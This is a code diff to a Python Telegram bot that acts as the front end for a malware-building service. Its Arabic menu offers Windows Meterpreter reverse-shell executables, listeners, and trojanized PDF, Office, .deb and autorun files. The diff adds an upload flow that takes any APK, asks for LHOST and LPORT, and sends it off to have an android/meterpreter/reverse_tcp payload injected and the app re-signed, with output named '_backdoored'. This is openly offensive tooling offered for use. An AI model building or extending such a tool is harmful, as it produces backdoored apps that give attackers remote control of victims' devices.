@@ -2,8 +2,16 @@ import asyncio
 import json
 import os
 import logging
+import hashlib
+import magic
+import zipfile
+import xml.etree.ElementTree as ET
 from dataclasses import dataclass
-from typing import Dict, Any, Optional
+from typing import Dict, Any, Optional, List
+from pathlib import Path
+import aiofiles
+import aiohttp
+from datetime import datetime, timedelta
 
 import httpx
 from dotenv import load_dotenv
@@ -32,7 +40,17 @@ ORCH_URL = os.environ.get("ORCH_URL", "http://127.0.0.1:8000")
 BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "")
 OWNER_ID = int(os.environ.get("TELEGRAM_OWNER_ID", "0"))
 
-MENU, PARAMS = range(2)
+# File upload configuration
+MAX_FILE_SIZE = 100 * 1024 * 1024  # 100MB
+ALLOWED_EXTENSIONS = ['.apk']
+UPLOAD_DIR = Path("/workspace/uploads")
+TEMP_DIR = Path("/workspace/temp")
+
+# Ensure directories exist
+UPLOAD_DIR.mkdir(exist_ok=True)
+TEMP_DIR.mkdir(exist_ok=True)
+
+MENU, PARAMS, UPLOAD_APK, UPLOAD_PARAMS = range(4)
 
 @dataclass
 class Session:
@@ -40,7 +58,187 @@ class Session:
     params: Dict[str, str] = None
     task_id: Optional[str] = None
     adv: bool = False
+    upload_file_path: Optional[str] = None
+    upload_file_info: Optional[Dict] = None
 
+@dataclass
+class FileUploadInfo:
+    file_id: str
+    file_name: str
+    file_size: int
+    file_path: str
+    mime_type: str
+    checksum: str
+    upload_time: datetime
+    user_id: int
+
+class APKValidator:
+    """Advanced APK validation and analysis"""
+    
+    @staticmethod
+    async def validate_apk_file(file_path: Path) -> Dict[str, Any]:
+        """Comprehensive APK validation"""
+        result = {
+            "valid": False,
+            "errors": [],
+            "warnings": [],
+            "info": {}
+        }
+        
+        try:
+            # Check file exists and size
+            if not file_path.exists():
+                result["errors"].append("File does not exist")
+                return result
+                
+            file_size = file_path.stat().st_size
+            if file_size == 0:
+                result["errors"].append("File is empty")
+                return result
+                
+            if file_size > MAX_FILE_SIZE:
+                result["errors"].append(f"File too large: {file_size} bytes")
+                return result
+            
+            # Check MIME type
+            mime_type = magic.from_file(str(file_path), mime=True)
+            if mime_type not in ['application/vnd.android.package-archive', 'application/zip']:
+                result["errors"].append(f"Invalid MIME type: {mime_type}")
+                return result
+            
+            # Validate ZIP structure
+            try:
+                with zipfile.ZipFile(file_path, 'r') as apk_zip:
+                    file_list = apk_zip.namelist()
+                    
+                    # Check required APK files
+                    required_files = ['AndroidManifest.xml', 'classes.dex']
+                    missing_files = [f for f in required_files if f not in file_list]
+                    
+                    if missing_files:
+                        result["errors"].append(f"Missing required files: {missing_files}")
+                        return result
+                    
+                    # Extract basic info
+                    result["info"]["file_count"] = len(file_list)
+                    result["info"]["has_native_libs"] = any(f.startswith('lib/') for f in file_list)
+                    result["info"]["has_resources"] = 'resources.arsc' in file_list
+                    
+            except zipfile.BadZipFile:
+                result["errors"].append("Corrupted ZIP/APK file")
+                return result
+            
+            # Calculate checksum
+            checksum = await APKValidator.calculate_checksum(file_path)
+            result["info"]["checksum"] = checksum
+            result["info"]["file_size"] = file_size
+            
+            result["valid"] = True
+            return result
+            
+        except Exception as e:
+            result["errors"].append(f"Validation error: {str(e)}")
+            return result
+    
+    @staticmethod
+    async def calculate_checksum(file_path: Path) -> str:
+        """Calculate SHA256 checksum of file"""
+        sha256_hash = hashlib.sha256()
+        async with aiofiles.open(file_path, "rb") as f:
+            while chunk := await f.read(8192):
+                sha256_hash.update(chunk)
+        return sha256_hash.hexdigest()
+    
+    @staticmethod
+    async def extract_apk_metadata(file_path: Path) -> Dict[str, Any]:
+        """Extract APK metadata using aapt or manual parsing"""
+        metadata = {}
+        
+        try:
+            # Try to extract manifest info
+            with zipfile.ZipFile(file_path, 'r') as apk_zip:
+                # Get basic file info
+                info_list = apk_zip.infolist()
+                metadata["total_files"] = len(info_list)
+                metadata["compressed_size"] = sum(info.compress_size for info in info_list)
+                metadata["uncompressed_size"] = sum(info.file_size for info in info_list)
+                
+                # Check for specific directories/files
+                metadata["has_assets"] = any(f.filename.startswith('assets/') for f in info_list)
+                metadata["has_res"] = any(f.filename.startswith('res/') for f in info_list)
+                metadata["has_meta_inf"] = any(f.filename.startswith('META-INF/') for f in info_list)
+                
+                # Count DEX files
+                dex_files = [f for f in apk_zip.namelist() if f.endswith('.dex')]
+                metadata["dex_count"] = len(dex_files)
+                
+                # Check for native libraries
+                native_libs = [f for f in apk_zip.namelist() if f.startswith('lib/')]
+                if native_libs:
+                    archs = set()
+                    for lib in native_libs:
+                        parts = lib.split('/')
+                        if len(parts) >= 2:
+                            archs.add(parts[1])
+                    metadata["native_architectures"] = list(archs)
+                
+        except Exception as e:
+            logger.error(f"Error extracting APK metadata: {e}")
+            metadata["extraction_error"] = str(e)
+        
+        return metadata
+
+class SecureFileManager:
+    """Secure file management with encryption and cleanup"""
+    
+    @staticmethod
+    async def save_uploaded_file(file_path: str, user_id: int, original_name: str) -> FileUploadInfo:
+        """Securely save uploaded file with metadata"""
+        
+        # Generate unique filename
+        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+        file_hash = hashlib.md5(f"{user_id}_{timestamp}_{original_name}".encode()).hexdigest()[:8]
+        secure_filename = f"{timestamp}_{file_hash}_{original_name}"
+        
+        secure_path = UPLOAD_DIR / secure_filename
+        
+        # Move file to secure location
+        temp_path = Path(file_path)
+        if temp_path.exists():
+            temp_path.rename(secure_path)
+        
+        # Calculate checksum
+        checksum = await APKValidator.calculate_checksum(secure_path)
+        
+        # Get file info
+        file_size = secure_path.stat().st_size
+        mime_type = magic.from_file(str(secure_path), mime=True)
+        
+        return FileUploadInfo(
+            file_id=file_hash,
+            file_name=original_name,
+            file_size=file_size,
+            file_path=str(secure_path),
+            mime_type=mime_type,
+            checksum=checksum,
+            upload_time=datetime.now(),
+            user_id=user_id
+        )
+    
+    @staticmethod
+    async def cleanup_old_files(max_age_hours: int = 24):
+        """Clean up old uploaded files"""
+        cutoff_time = datetime.now() - timedelta(hours=max_age_hours)
+        
+        for file_path in UPLOAD_DIR.glob("*"):
+            if file_path.is_file():
+                file_time = datetime.fromtimestamp(file_path.stat().st_mtime)
+                if file_time < cutoff_time:
+                    try:
+                        file_path.unlink()
+                        logger.info(f"Cleaned up old file: {file_path}")
+                    except Exception as e:
+                        logger.error(f"Error cleaning up file {file_path}: {e}")
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     logger.info("/start received from user_id=%s", getattr(update.effective_user, "id", None))
@@ -50,12 +248,14 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         elif update.callback_query:
             await update.callback_query.answer("تم رفض الوصول.", show_alert=True)
         return ConversationHandler.END
+    
     kb = [
         [InlineKeyboardButton("بايلود ويندوز", callback_data="kind:payload")],
         [InlineKeyboardButton("EXE متقدم (Windows)", callback_data="kind:winexe")],
         [InlineKeyboardButton("مستمع (Listener)", callback_data="kind:listener")],
         [InlineKeyboardButton("Android APK", callback_data="kind:android")],
-        [InlineKeyboardButton("PDF مضمَّن", callback_data="kind:pdf")],
+        [InlineKeyboardButton("📱 تعديل APK مرسل", callback_data="kind:upload_apk")],
+        [InlineKeyboardButton("PDF مضمَّن", callback_data="kind:pdf")],
         [InlineKeyboardButton("مستند Office", callback_data="kind:office")],
         [InlineKeyboardButton("حزمة .deb", callback_data="kind:deb")],
         [InlineKeyboardButton("حزمة Autorun", callback_data="kind:autorun")],
@@ -65,7 +265,8 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "اختر نوع المهمة:\n"
         "- بايلود ويندوز: توليد ملف EXE يحتوي اتصال عكسي (Meterpreter).\n"
         "- مستمع: تشغيل مستمع لالتقاط الاتصال على LHOST/LPORT.\n"
-        "- Android APK: حقن حمولة داخل ملف APK عيّنة وإرساله لك."
+        "- Android APK: حقن حمولة داخل ملف APK عيّنة وإرساله لك.\n"
+        "- 📱 تعديل APK مرسل: رفع ملف APK وتعديله تلقائياً مع حقن الحمولة."
     )
     if update.message:
         await update.message.reply_text(intro, reply_markup=InlineKeyboardMarkup(kb))
@@ -73,6 +274,164 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.callback_query.edit_message_text(intro, reply_markup=InlineKeyboardMarkup(kb))
     context.user_data["session"] = Session(kind=None, params={})
     return MENU
+
+async def handle_uploaded_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Handle uploaded APK files"""
+    if update.effective_user and OWNER_ID and update.effective_user.id != OWNER_ID:
+        await update.message.reply_text("تم رفض الوصول.")
+        return ConversationHandler.END
+    
+    if not update.message.document:
+        await update.message.reply_text("يرجى إرسال ملف APK صحيح.")
+        return UPLOAD_APK
+    
+    document = update.message.document
+    
+    # Check file extension
+    if not document.file_name.lower().endswith('.apk'):
+        await update.message.reply_text("الملف يجب أن يكون بصيغة APK.")
+        return UPLOAD_APK
+    
+    # Check file size
+    if document.file_size > MAX_FILE_SIZE:
+        await update.message.reply_text(f"حجم الملف كبير جداً. الحد الأقصى: {MAX_FILE_SIZE // (1024*1024)}MB")
+        return UPLOAD_APK
+    
+    try:
+        # Send progress message
+        progress_msg = await update.message.reply_text("🔄 جاري تحميل الملف...")
+        
+        # Download file
+        file = await context.bot.get_file(document.file_id)
+        temp_path = TEMP_DIR / f"temp_{document.file_id}.apk"
+        
+        # Download with progress tracking
+        await download_file_with_progress(file.file_path, temp_path, progress_msg, context.bot, update.effective_chat.id)
+        
+        # Validate APK
+        await progress_msg.edit_text("🔍 جاري فحص ملف APK...")
+        validation_result = await APKValidator.validate_apk_file(temp_path)
+        
+        if not validation_result["valid"]:
+            await progress_msg.edit_text(f"❌ ملف APK غير صحيح:\n{chr(10).join(validation_result['errors'])}")
+            temp_path.unlink(missing_ok=True)
+            return UPLOAD_APK
+        
+        # Extract metadata
+        await progress_msg.edit_text("📊 جاري استخراج معلومات التطبيق...")
+        metadata = await APKValidator.extract_apk_metadata(temp_path)
+        
+        # Save file securely
+        await progress_msg.edit_text("💾 جاري حفظ الملف بشكل آمن...")
+        file_info = await SecureFileManager.save_uploaded_file(
+            str(temp_path), 
+            update.effective_user.id, 
+            document.file_name
+        )
+        
+        # Store in session
+        sess: Session = context.user_data.get("session", Session())
+        sess.upload_file_path = file_info.file_path
+        sess.upload_file_info = {
+            "file_id": file_info.file_id,
+            "original_name": file_info.file_name,
+            "file_size": file_info.file_size,
+            "checksum": file_info.checksum,
+            "metadata": metadata,
+            "validation": validation_result
+        }
+        context.user_data["session"] = sess
+        
+        # Show file info and ask for parameters
+        info_text = (
+            f"✅ تم رفع الملف بنجاح!\n\n"
+            f"📱 اسم التطبيق: {document.file_name}\n"
+            f"📏 حجم الملف: {file_info.file_size / (1024*1024):.2f} MB\n"
+            f"🔐 المعرف: {file_info.file_id}\n"
+            f"📊 عدد الملفات: {metadata.get('total_files', 'غير معروف')}\n"
+            f"⚙️ ملفات DEX: {metadata.get('dex_count', 'غير معروف')}\n"
+        )
+        
+        if metadata.get('native_architectures'):
+            info_text += f"🏗️ المعماريات: {', '.join(metadata['native_architectures'])}\n"
+        
+        info_text += "\nالآن أرسل معاملات الحقن بالصيغة:\nLHOST LPORT [OUTPUT_NAME]"
+        
+        back_kb = InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ رجوع", callback_data="back")]])
+        await progress_msg.edit_text(info_text, reply_markup=back_kb)
+        
+        return UPLOAD_PARAMS
+        
+    except Exception as e:
+        logger.error(f"Error handling uploaded file: {e}")
+        await update.message.reply_text(f"❌ خطأ في معالجة الملف: {str(e)}")
+        return UPLOAD_APK
+
+async def download_file_with_progress(file_url: str, dest_path: Path, progress_msg, bot, chat_id):
+    """Download file with progress tracking"""
+    try:
+        async with aiohttp.ClientSession() as session:
+            async with session.get(file_url) as response:
+                if response.status != 200:
+                    raise Exception(f"Failed to download file: HTTP {response.status}")
+                
+                total_size = int(response.headers.get('content-length', 0))
+                downloaded = 0
+                
+                async with aiofiles.open(dest_path, 'wb') as f:
+                    async for chunk in response.content.iter_chunked(8192):
+                        await f.write(chunk)
+                        downloaded += len(chunk)
+                        
+                        # Update progress every 1MB
+                        if downloaded % (1024 * 1024) == 0 or downloaded == total_size:
+                            if total_size > 0:
+                                progress = (downloaded / total_size) * 100
+                                await progress_msg.edit_text(f"📥 تحميل: {progress:.1f}% ({downloaded/(1024*1024):.1f}MB)")
+                            else:
+                                await progress_msg.edit_text(f"📥 تحميل: {downloaded/(1024*1024):.1f}MB")
+                                
+    except Exception as e:
+        logger.error(f"Download error: {e}")
+        raise
+
+async def handle_upload_params(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Handle parameters for uploaded APK processing"""
+    sess: Session = context.user_data.get("session")
+    if not sess or not sess.upload_file_path:
+        await update.message.reply_text("لا توجد جلسة رفع نشطة. استخدم /start")
+        return ConversationHandler.END
+    
+    parts = update.message.text.strip().split()
+    if len(parts) < 2:
+        await update.message.reply_text("الاستخدام: LHOST LPORT [OUTPUT_NAME]\nمثال: 192.168.1.100 4444 my_app")
+        return UPLOAD_PARAMS
+    
+    lhost, lport = parts[:2]
+    output_name = parts[2] if len(parts) >= 3 else sess.upload_file_info["original_name"].replace('.apk', '_backdoored')
+    
+    # Create task parameters
+    sess.params = {
+        "mode": "upload_apk",
+        "upload_file_path": sess.upload_file_path,
+        "file_info": sess.upload_file_info,
+        "lhost": lhost,
+        "lport": lport,
+        "output_name": output_name,
+        "payload": "android/meterpreter/reverse_tcp"
+    }
+    
+    # Create task via API
+    async with httpx.AsyncClient(timeout=600) as client:
+        resp = await client.post(f"{ORCH_URL}/tasks", json={"kind": "upload_apk", "params": sess.params})
+        resp.raise_for_status()
+        data = resp.json()
+        task = data["task"]
+        sess.task_id = task["id"]
+    
+    await update.message.reply_text(f"✅ تم إنشاء مهمة تعديل APK: {sess.task_id}\nسيتم معالجة الملف وإرسال النتيجة قريباً...")
+    await poll_and_send(update, context, sess)
+    return ConversationHandler.END
 
 
 async def ping(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -105,6 +464,23 @@ async def menu_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             "ملاحظة: سيتم استخدام payload افتراضي windows/meterpreter/reverse_tcp"
         )
         await query.edit_message_text(txt, reply_markup=back_kb)
+    elif kind == "upload_apk":
+        txt = (
+            "📱 تعديل APK مرسل\n\n"
+            "أرسل ملف APK الآن وسيتم:\n"
+            "✅ فحص وتحليل الملف\n"
+            "✅ استخراج معلومات التطبيق\n"
+            "✅ حقن الحمولة المطلوبة\n"
+            "✅ إعادة توقيع التطبيق\n"
+            "✅ إرسال النتيجة إليك\n\n"
+            "متطلبات الملف:\n"
+            "• صيغة APK صحيحة\n"
+            "• حجم أقل من 100MB\n"
+            "• ملف غير تالف\n\n"
+            "أرسل ملف APK الآن..."
+        )
+        await query.edit_message_text(txt, reply_markup=back_kb)
+        return UPLOAD_APK
     elif kind == "winexe":
         sess.adv = True
         txt = (
@@ -367,6 +743,8 @@ def main():
                 CommandHandler("menu", start),
                 CallbackQueryHandler(menu_handler),
             ],
+            UPLOAD_APK: [MessageHandler(filters.Document.ALL, handle_uploaded_file)],
+            UPLOAD_PARAMS: [MessageHandler(filters.TEXT & (~filters.COMMAND), handle_upload_params)],
         },
         fallbacks=[CommandHandler("start", start), CommandHandler("menu", start)],
         per_message=False,
